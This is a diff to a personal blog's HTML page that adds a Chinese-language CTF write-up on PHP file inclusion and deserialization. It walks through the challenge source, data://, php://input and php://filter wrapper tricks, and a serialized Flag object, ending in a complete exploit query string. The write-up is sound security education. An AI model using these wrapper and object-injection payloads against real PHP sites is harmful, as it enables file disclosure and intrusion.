@@ -163,6 +163,88 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/18/ctfhub_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="朝歌">
+      <meta itemprop="description" content="道可道，非常道。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CHacker">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/18/ctfhub_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">文件包含和反序列化</a>
+        </h2>
+
+        <div class="post-meta">
+	
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-09-18 16:02:59 / 修改时间：16:08:57" itemprop="dateCreated datePublished" datetime="2022-09-18T16:02:59+08:00">2022-09-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">-ctf</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>ctfhub：<br><a target="_blank" rel="noopener" href="https://i.imgtg.com/2022/09/18/y6yBX.png">https://i.imgtg.com/2022/09/18/y6yBX.png</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li>这里利用伪协议来绕过$text,在官方手册中file_get_contents()是用来将文件的内容读入到一个字符串中的函数。<br><strong>file_get_contents()可以读取远程，所以可以用伪协议来作为输入和远程读取使用真协议一样</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br><span class="line">#d2VsY29tZSB0byB0aGUgempjdGY= 为 welcome to the zjctf的base64编码值</span><br></pre></td></tr></table></figure>
+<em>data:&#x2F;&#x2F;text&#x2F;plain协议</em><br>此协议需要在双on的情况下才能使用，很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入<br><em>php:input协议</em><br>此协议需要allow_url_include为on，可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?text=php://input</span><br><span class="line">POST数据：welcome to the zjctf</span><br></pre></td></tr></table></figure></li>
+<li>绕过$file这里是文件包含漏洞,和上面一样,通过伪协议来获取内容.<br>这里过滤了flag,然后注释中出现了useless.php,所以判断需要读取useless.php文件.<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
+useless.php内容<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></li>
+<li>根据useless.php中的内容发现这里是个反序列化,并且__tostring是个魔术方法,在类实例被用作字符串处理时,会自动触发,且这里触发的内容是读取文件并输出,所以只需要设置$file为flag.php即可<br>但是这里需要将这个文件能够执行,所以不能用base64读取文件,因为php无法识别base64的代码,所以这里再获取flag时,直接<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file=useless.php</span><br></pre></td></tr></table></figure>
+即可将代码包含到文件中,并且可以执行<br>这里要构造$password,可以将类复制下来,去生成一个payload,所以进行序列化,获取序列化字符串<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nihao&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">#得到$b为:</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;  </span><br></pre></td></tr></table></figure>
+最后直接构造出payload<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line">POST数据：welcome to the zjctf</span><br></pre></td></tr></table></figure>
+提交获取flag.</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/08/RIP%E5%8D%8F%E8%AE%AE%E5%92%8C%E6%A8%A1%E6%8B%9F%E6%94%BB%E5%87%BB/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -326,20 +408,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-count">2</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -388,7 +470,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共539字</span>
+  <span class="post-count">博客全站共1.3k字</span>
 </div>
 
 
